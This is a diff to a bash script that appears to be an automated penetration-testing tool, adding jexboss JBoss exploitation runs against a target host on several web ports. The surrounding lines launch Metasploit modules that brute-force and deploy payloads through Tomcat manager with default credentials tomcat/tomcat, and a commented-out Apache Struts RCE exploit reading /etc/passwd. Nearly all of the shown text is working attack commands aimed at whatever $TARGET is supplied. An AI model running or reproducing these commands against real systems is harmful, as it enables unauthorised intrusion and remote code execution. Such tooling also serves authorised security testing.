@@ -996,6 +996,8 @@ else
 	cd ..
 	nikto -h http://$TARGET:8000 
 	cutycapt --url=http://$TARGET:8000 --out=loot/$TARGET-port8000.jpg
+	python jexboss/jexboss.py -host http://$TARGET:8000
+
 fi
 
 if [ -z "$port_8100" ];
@@ -1014,6 +1016,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8100 
 	cutycapt --url=http://$TARGET:8100 --out=loot/$TARGET-port8100.jpg
+	python jexboss/jexboss.py -host http://$TARGET:8100
 fi
 
 if [ -z "$port_8080" ];
@@ -1036,8 +1039,9 @@ else
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
-	python jexboss/jexboss.py http://$TARGET:8080
-	python jexboss/jexboss.py https://$TARGET:8080
+	python jexboss/jexboss.py -host http://$TARGET:8080
+	python jexboss/jexboss.py -host https://$TARGET:8080
+	
 fi
 
 if [ -z "$port_8180" ];
@@ -1061,6 +1065,7 @@ else
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	python jexboss/jexboss.py -host http://$TARGET:8180
 fi
 
 if [ -z "$port_8443" ];
@@ -1081,6 +1086,7 @@ else
 	nikto -h https://$TARGET:8443 
 	cutycapt --url=https://$TARGET:8443 --out=loot/$TARGET-port8443.jpg
 	nmap -p 8443 -T5 --script=*proxy* $TARGET
+	python jexboss/jexboss.py -host https://$TARGET:8443	
 fi
 
 if [ -z "$port_8888" ];
@@ -1095,6 +1101,7 @@ else
 	xsstracer $TARGET 8888
 	nikto -h http://$TARGET:8888 
 	cutycapt --url=https://$TARGET:8888 --out=loot/$TARGET-port8888.jpg
+	python jexboss/jexboss.py -host http://$TARGET:8888	
 fi
 
 if [ -z "$port_10000" ];
